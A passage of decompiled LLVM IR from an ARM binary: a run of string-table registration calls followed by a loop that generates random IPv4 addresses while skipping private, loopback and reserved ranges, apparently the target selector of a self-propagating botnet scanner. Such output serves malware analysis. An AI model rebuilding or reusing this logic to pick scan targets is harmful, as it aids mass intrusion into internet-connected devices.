  %v4_11ac0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32 ptrtoint (i32* @global_var_144fc.301 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32* %r1.global-to-local, align 4
  %v0_11acc = load i32, i32* @r6, align 4
  store i32 %v0_11acc, i32* %r2.global-to-local, align 4
  %v4_11ad0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32 %v0_11acc)
  store i32 ptrtoint ([5 x i8]* @global_var_1454c.319 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1454c.319 to i32), i32* %r1.global-to-local, align 4
  %v5_11ae0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1454c.319 to i32), i32 ptrtoint ([5 x i8]* @global_var_1454c.319 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14554.321 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11af0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_14554.321 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14554.321 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b00 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_14554.321 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14560.323 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b10 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_14560.323 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_14568.325 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_11b20 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint ([6 x i8]* @global_var_14568.325 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14570.327 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_11b30 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint ([5 x i8]* @global_var_14570.327 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_14578.329 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11b40 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint ([6 x i8]* @global_var_14578.329 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14580.331 to i32), i32* %r1.global-to-local, align 4
  %v0_11b4c = load i32, i32* @r6, align 4
  store i32 %v0_11b4c, i32* %r2.global-to-local, align 4
  %v4_11b50 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_14580.331 to i32), i32 %v0_11b4c)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144e8.297 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_11b60 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_144e8.297 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144fc.301 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b70 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_144fc.301 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b80 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14588.333 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b90 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_14588.333 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14598.335 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_11ba0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_14598.335 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_145a4.337 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11bb0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint ([5 x i8]* @global_var_145a4.337 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_144c0.339 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_11bc0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint ([5 x i8]* @global_var_144c0.339 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145ac.341 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_11bd0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_145ac.341 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145b8.343 to i32), i32* %r1.global-to-local, align 4
  %v0_11bdc = load i32, i32* @r6, align 4
  store i32 %v0_11bdc, i32* %r2.global-to-local, align 4
  %v4_11be0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_145b8.343 to i32), i32 %v0_11bdc)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145c0.345 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11bf0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_145c0.345 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145c4.347 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_11c00 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_145c4.347 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_145cc.349 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_11c10 = call i32 @function_114f0(i32 ptrtoint ([4 x i8]* @global_var_145cc.349 to i32), i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145d0.351 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_11c20 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_145d0.351 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_145dc.353 to i32), i32* %r1.global-to-local, align 4
  %v0_11c2c = load i32, i32* @r6, align 4
  store i32 %v0_11c2c, i32* %r2.global-to-local, align 4
  %v5_11c30 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint ([7 x i8]* @global_var_145dc.353 to i32), i32 %v0_11c2c)
  store i32 ptrtoint ([7 x i8]* @global_var_145e4.355 to i32), i32* %r0.global-to-local, align 4
  %v0_11c38 = load i32, i32* @r6, align 4
  store i32 %v0_11c38, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_145e4.355 to i32), i32* %r1.global-to-local, align 4
  %v5_11c40 = call i32 @function_114f0(i32 ptrtoint ([7 x i8]* @global_var_145e4.355 to i32), i32 ptrtoint ([7 x i8]* @global_var_145e4.355 to i32), i32 %v0_11c38)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145ec.357 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_11c50 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_145ec.357 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145ec.357 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_11c60 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_145ec.357 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145f8.359 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_11c70 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_145f8.359 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_14604.361 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32* %r1.global-to-local, align 4
  %v0_11c7c = load i32, i32* @r6, align 4
  store i32 %v0_11c7c, i32* %r2.global-to-local, align 4
  %v4_11c80 = call i32 @function_114f0(i32 ptrtoint ([7 x i8]* @global_var_14604.361 to i32), i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32 %v0_11c7c)
  %v0_11c84 = load i32, i32* @r6, align 4
  store i32 %v0_11c84, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1460c.363 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_14614.365 to i32), i32* %r1.global-to-local, align 4
  %v4_11c90 = call i32 @function_114f0(i32 ptrtoint (i32* @global_var_1460c.363 to i32), i32 ptrtoint ([7 x i8]* @global_var_14614.365 to i32), i32 %v0_11c84)
  store i32 ptrtoint ([9 x i8]* @global_var_1461c.367 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1461c.367 to i32), i32* %r1.global-to-local, align 4
  %v5_11ca0 = call i32 @function_114f0(i32 ptrtoint ([9 x i8]* @global_var_1461c.367 to i32), i32 ptrtoint ([9 x i8]* @global_var_1461c.367 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_14628.369 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14628.369 to i32), i32* %r1.global-to-local, align 4
  %v5_11cb0 = call i32 @function_114f0(i32 ptrtoint ([9 x i8]* @global_var_14628.369 to i32), i32 ptrtoint ([9 x i8]* @global_var_14628.369 to i32), i32 8)
  %v2_11cb8 = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_11cb8, i32* %r0.global-to-local, align 4
  %v2_11cbc = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_11cbc, i32* %r1.global-to-local, align 4
  %tmp278 = bitcast i32* %stack_var_-1842 to i8*
  %v1_11fe8 = add i32 %v2_11cb8, 16
  %v2_11fe8 = inttoptr i32 %v1_11fe8 to i32*
  %v1_1200c = or i32 %v2_11cbc, 1
  %v2_1200c = inttoptr i32 %v1_1200c to i8*
  %v1_12030 = or i32 %v2_11cbc, 2
  %v2_12030 = inttoptr i32 %v1_12030 to i8*
  %v1_12034 = or i32 %v2_11cbc, 3
  %v2_12034 = inttoptr i32 %v1_12034 to i8*
  %v1_11ff8 = add i32 %v2_11cb8, 9
  %v2_11ff8 = inttoptr i32 %v1_11ff8 to i8*
  %v1_12048 = add i32 %v2_11cbc, 13
  %v2_12048 = inttoptr i32 %v1_12048 to i8*
  %v1_1206c = add i32 %v2_11cbc, 8
  %v2_1206c = inttoptr i32 %v1_1206c to i32*
  %v1_120ac = add i32 %v2_11cb8, 12
  %v2_120ac = inttoptr i32 %v1_120ac to i32*
  %v2_12238 = ptrtoint i32* %stack_var_-36 to i32
  %v2_122bc = ptrtoint i32* %stack_var_-348 to i32
  %v2_122c4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_122c8 = ptrtoint i32* %stack_var_-220 to i32
  %v2_12550 = ptrtoint i32* %stack_var_-41 to i32
  %v2_12d40 = ptrtoint i32* %stack_var_-84 to i32
  %v2_12d48 = ptrtoint i32* %stack_var_-73 to i32
  %v2_128bc = ptrtoint i32* %stack_var_-56 to i32
  %v2_12970 = ptrtoint i32* %stack_var_-48 to i32
  %v2_11f50 = ptrtoint i32* %stack_var_-92 to i32
  %tmp279 = bitcast i32* %stack_var_-92 to %sockaddr*
  br label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_12320, %dec_label_pc_117e0
  %stack_var_-1872.0 = phi i32 [ %tmp240, %dec_label_pc_117e0 ], [ %stack_var_-1872.1, %dec_label_pc_12320 ]
  store i32 ptrtoint (i32* @global_var_1cdf0.240 to i32), i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1872.0, i32* %r3.global-to-local, align 4
  %v2_11cd0 = load i32, i32* @global_var_1cdf0.240, align 4
  store i32 %v2_11cd0, i32* @r8, align 4
  %v3_11cd4 = icmp uge i32 %stack_var_-1872.0, %v2_11cd0
  store i1 %v3_11cd4, i1* %cpsr_c.global-to-local, align 1
  %v9_11cd4 = icmp eq i32 %stack_var_-1872.0, %v2_11cd0
  store i1 %v9_11cd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11cd4, label %dec_label_pc_11f80, label %dec_label_pc_11cdc

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cc8
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %.thread48.dec_label_pc_11ce8_crit_edge, %dec_label_pc_11cdc
  %v0_11ce8 = phi i32 [ %v0_11ce8.pre, %.thread48.dec_label_pc_11ce8_crit_edge ], [ 0, %dec_label_pc_11cdc ]
  store i32 %v0_11ce8, i32* %stack_var_-92, align 4
  store i32 %v0_11ce8, i32* %stack_var_-84, align 4
  %v0_11cf8 = call i32 @function_10bd8()
  %v1_11cf8 = trunc i32 %v0_11cf8 to i8
  store i32 %v0_11cf8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdf4.141 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32* %r1.global-to-local, align 4
  %v2_11d04 = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_11d04, i32* %r2.global-to-local, align 4
  %v2_11d08 = and i32 %v0_11cf8, 128
  %v3_11d08 = icmp ne i32 %v2_11d08, 0
  store i1 %v3_11d08, i1* %cpsr_c.global-to-local, align 1
  %v4_11d08 = sdiv i32 %v0_11cf8, 256
  store i32 %v4_11d08, i32* %r3.global-to-local, align 4
  %v1_11d0c = trunc i32 %v4_11d08 to i8
  store i8 %v1_11d0c, i8* bitcast (i32* @global_var_1cdc5.263 to i8*), align 4
  store i32 %v2_11d04, i32* @global_var_1cdcc.370, align 4
  store i8 %v1_11cf8, i8* bitcast (i32* @global_var_1cdc4.267 to i8*), align 4
  br label %dec_label_pc_11d18

dec_label_pc_11d18:                               ; preds = %dec_label_pc_11dec, %dec_label_pc_11d48, %dec_label_pc_11e20, %dec_label_pc_11e14, %dec_label_pc_11e08, %dec_label_pc_11dfc, %.thread33, %bb298, %bb297, %bb296, %bb295, %bb294, %dec_label_pc_11de4, %dec_label_pc_11ddc, %bb290, %dec_label_pc_11dac, %dec_label_pc_11d88, %bb283, %dec_label_pc_11d58, %bb282, %dec_label_pc_11d40, %bb281, %bb300, %dec_label_pc_11ce8
  %v0_11d18 = call i32 @function_10bd8()
  store i32 %v0_11d18, i32* %r0.global-to-local, align 4
  %v1_11d1c = urem i32 %v0_11d18, 256
  store i32 %v1_11d1c, i32* %r1.global-to-local, align 4
  %v3_11d20 = udiv i32 %v0_11d18, 256
  store i32 %v3_11d20, i32* %r3.global-to-local, align 4
  %v3_11d24 = udiv i32 %v0_11d18, 65536
  store i32 %v3_11d24, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11d28 = icmp eq i32 %v1_11d1c, 0
  store i1 %v2_11d28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d28, label %bb281, label %bb280

bb280:                                            ; preds = %dec_label_pc_11d18
  %v3_11d2c = icmp ugt i32 %v1_11d1c, 126
  store i1 %v3_11d2c, i1* %cpsr_c.global-to-local, align 1
  %v8_11d2c = icmp eq i32 %v1_11d1c, 127
  store i1 %v8_11d2c, i1* %cpsr_z.global-to-local, align 1
  br label %bb281

bb281:                                            ; preds = %dec_label_pc_11d18, %bb280
  %v0_11d3c = phi i1 [ true, %dec_label_pc_11d18 ], [ %v8_11d2c, %bb280 ]
  %v1_11d30 = urem i32 %v3_11d20, 256
  store i32 %v1_11d30, i32* %ip.global-to-local, align 4
  %v1_11d34 = urem i32 %v3_11d24, 256
  store i32 %v1_11d34, i32* %r2.global-to-local, align 4
  %v1_11d38 = and i32 %v0_11d18, 8388608
  %v2_11d38 = icmp ne i32 %v1_11d38, 0
  store i1 %v2_11d38, i1* %cpsr_c.global-to-local, align 1
  %v3_11d38 = udiv i32 %v0_11d18, 16777216
  store i32 %v3_11d38, i32* %r0.global-to-local, align 4
  br i1 %v0_11d3c, label %dec_label_pc_11d18, label %dec_label_pc_11d40

dec_label_pc_11d40:                               ; preds = %bb281
  %v2_11d40 = icmp ugt i32 %v1_11d1c, 2
  store i1 %v2_11d40, i1* %cpsr_c.global-to-local, align 1
  %v7_11d40 = icmp eq i32 %v1_11d1c, 3
  store i1 %v7_11d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d40, label %dec_label_pc_11d18, label %dec_label_pc_11d48

dec_label_pc_11d48:                               ; preds = %dec_label_pc_11d40
  %v1_11d48 = add nsw i32 %v1_11d1c, -15
  store i32 %v1_11d48, i32* %r3.global-to-local, align 4
  %v2_11d4c = icmp ugt i32 %v1_11d1c, 55
  store i1 %v2_11d4c, i1* %cpsr_c.global-to-local, align 1
  %v7_11d4c = icmp eq i32 %v1_11d1c, 56
  store i1 %v7_11d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d4c, label %dec_label_pc_11d18, label %bb282

bb282:                                            ; preds = %dec_label_pc_11d48
  %v3_11d50 = icmp ne i32 %v1_11d48, 0
  store i1 %v3_11d50, i1* %cpsr_c.global-to-local, align 1
  %v8_11d50 = icmp eq i32 %v1_11d48, 1
  store i1 %v8_11d50, i1* %cpsr_z.global-to-local, align 1
  %v2_11d54 = xor i1 %v3_11d50, true
  %v3_11d54 = or i1 %v8_11d50, %v2_11d54
  br i1 %v3_11d54, label %dec_label_pc_11d18, label %dec_label_pc_11d58

dec_label_pc_11d58:                               ; preds = %bb282
  %v2_11d58 = icmp ugt i32 %v1_11d1c, 9
  store i1 %v2_11d58, i1* %cpsr_c.global-to-local, align 1
  %v7_11d58 = icmp eq i32 %v1_11d1c, 10
  store i1 %v7_11d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d58, label %dec_label_pc_11d18, label %dec_label_pc_11d60

dec_label_pc_11d60:                               ; preds = %dec_label_pc_11d58
  %v2_11d60 = icmp ugt i32 %v1_11d1c, 191
  store i1 %v2_11d60, i1* %cpsr_c.global-to-local, align 1
  %v7_11d60 = icmp eq i32 %v1_11d1c, 192
  store i1 %v7_11d60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d60, label %bb283, label %dec_label_pc_11d6c

bb283:                                            ; preds = %dec_label_pc_11d60
  %v3_11d64 = icmp ugt i32 %v1_11d30, 167
  store i1 %v3_11d64, i1* %cpsr_c.global-to-local, align 1
  %v8_11d64 = icmp eq i32 %v1_11d30, 168
  store i1 %v8_11d64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11d64, label %dec_label_pc_11d18, label %dec_label_pc_11d6c

dec_label_pc_11d6c:                               ; preds = %dec_label_pc_11d60, %bb283
  %v7_11d6c = icmp eq i32 %v1_11d1c, 172
  %.349 = zext i1 %v7_11d6c to i32
  store i32 %.349, i32* %r3.global-to-local, align 4
  %v2_11d78 = icmp ugt i32 %v1_11d30, 14
  store i1 %v2_11d78, i1* %cpsr_c.global-to-local, align 1
  %v7_11d78 = icmp eq i32 %v1_11d30, 15
  store i1 %v7_11d78, i1* %cpsr_z.global-to-local, align 1
  %v2_11d7c = xor i1 %v2_11d78, true
  %v3_11d7c = or i1 %v7_11d78, %v2_11d7c
  br i1 %v3_11d7c, label %.thread11, label %bb286

.thread11:                                        ; preds = %dec_label_pc_11d6c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11d90

bb286:                                            ; preds = %dec_label_pc_11d6c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11d80 = icmp eq i1 %v7_11d6c, false
  store i1 %v2_11d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d80, label %dec_label_pc_11d90, label %dec_label_pc_11d88

dec_label_pc_11d88:                               ; preds = %bb286
  %v2_11d88 = icmp ugt i32 %v1_11d30, 30
  store i1 %v2_11d88, i1* %cpsr_c.global-to-local, align 1
  %v7_11d88 = icmp eq i32 %v1_11d30, 31
  store i1 %v7_11d88, i1* %cpsr_z.global-to-local, align 1
  %v2_11d8c = xor i1 %v2_11d88, true
  %v3_11d8c = or i1 %v7_11d88, %v2_11d8c
  br i1 %v3_11d8c, label %dec_label_pc_11d18, label %dec_label_pc_11d90

dec_label_pc_11d90:                               ; preds = %.thread11, %dec_label_pc_11d88, %bb286
  %v7_11d90 = icmp eq i32 %v1_11d1c, 100
  %.350 = zext i1 %v7_11d90 to i32
  store i32 %.350, i32* %r3.global-to-local, align 4
  %v2_11d9c = icmp ugt i32 %v1_11d30, 62
  store i1 %v2_11d9c, i1* %cpsr_c.global-to-local, align 1
  %v7_11d9c = icmp eq i32 %v1_11d30, 63
  store i1 %v7_11d9c, i1* %cpsr_z.global-to-local, align 1
  %v2_11da0 = xor i1 %v2_11d9c, true
  %v3_11da0 = or i1 %v7_11d9c, %v2_11da0
  br i1 %v3_11da0, label %.thread16, label %bb289

.thread16:                                        ; preds = %dec_label_pc_11d90
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11db4

bb289:                                            ; preds = %dec_label_pc_11d90
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11da4 = icmp eq i1 %v7_11d90, false
  store i1 %v2_11da4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11da4, label %dec_label_pc_11db4, label %dec_label_pc_11dac

dec_label_pc_11dac:                               ; preds = %bb289
  %v2_11dac = icmp ugt i32 %v1_11d30, 125
  store i1 %v2_11dac, i1* %cpsr_c.global-to-local, align 1
  %v7_11dac = icmp eq i32 %v1_11d30, 126
  store i1 %v7_11dac, i1* %cpsr_z.global-to-local, align 1
  %v2_11db0 = xor i1 %v2_11dac, true
  %v3_11db0 = or i1 %v7_11dac, %v2_11db0
  br i1 %v3_11db0, label %dec_label_pc_11d18, label %dec_label_pc_11db4

dec_label_pc_11db4:                               ; preds = %.thread16, %dec_label_pc_11dac, %bb289
  %v2_11db4 = icmp ugt i32 %v1_11d1c, 168
  store i1 %v2_11db4, i1* %cpsr_c.global-to-local, align 1
  %v7_11db4 = icmp eq i32 %v1_11d1c, 169
  store i1 %v7_11db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11db4, label %bb290, label %dec_label_pc_11dc0

bb290:                                            ; preds = %dec_label_pc_11db4
  %v3_11db8 = icmp eq i32 %v1_11d30, 255
  store i1 %v3_11db8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_11db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11db8, label %dec_label_pc_11d18, label %dec_label_pc_11dc0

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11db4, %bb290
  %v7_11dc0 = icmp eq i32 %v1_11d1c, 198
  %.351 = zext i1 %v7_11dc0 to i32
  store i32 %.351, i32* %r3.global-to-local, align 4
  %v2_11dcc = icmp ugt i32 %v1_11d30, 16
  store i1 %v2_11dcc, i1* %cpsr_c.global-to-local, align 1
  %v7_11dcc = icmp eq i32 %v1_11d30, 17
  store i1 %v7_11dcc, i1* %cpsr_z.global-to-local, align 1
  %v2_11dd0 = xor i1 %v2_11dcc, true
  %v3_11dd0 = or i1 %v7_11dcc, %v2_11dd0
  br i1 %v3_11dd0, label %.thread22, label %bb293

.thread22:                                        ; preds = %dec_label_pc_11dc0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11de4

bb293:                                            ; preds = %dec_label_pc_11dc0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11dd4 = icmp eq i1 %v7_11dc0, false
  store i1 %v2_11dd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11dd4, label %dec_label_pc_11de4, label %dec_label_pc_11ddc

dec_label_pc_11ddc:                               ; preds = %bb293
  %v2_11ddc = icmp ugt i32 %v1_11d30, 18
  store i1 %v2_11ddc, i1* %cpsr_c.global-to-local, align 1
  %v7_11ddc = icmp eq i32 %v1_11d30, 19
  store i1 %v7_11ddc, i1* %cpsr_z.global-to-local, align 1
  %v2_11de0 = xor i1 %v2_11ddc, true
  %v3_11de0 = or i1 %v7_11ddc, %v2_11de0
  br i1 %v3_11de0, label %dec_label_pc_11d18, label %dec_label_pc_11de4

dec_label_pc_11de4:                               ; preds = %.thread22, %dec_label_pc_11ddc, %bb293
  %v2_11de4 = icmp ugt i32 %v1_11d1c, 222
  store i1 %v2_11de4, i1* %cpsr_c.global-to-local, align 1
  %v7_11de4 = icmp eq i32 %v1_11d1c, 223
  store i1 %v7_11de4, i1* %cpsr_z.global-to-local, align 1
  %v2_11de8 = xor i1 %v7_11de4, true
  %v3_11de8 = and i1 %v2_11de4, %v2_11de8
  br i1 %v3_11de8, label %dec_label_pc_11d18, label %dec_label_pc_11dec

dec_label_pc_11dec:                               ; preds = %dec_label_pc_11de4
  %v1_11dec = add nsw i32 %v1_11d1c, -6
  store i32 %v1_11dec, i32* %r3.global-to-local, align 4
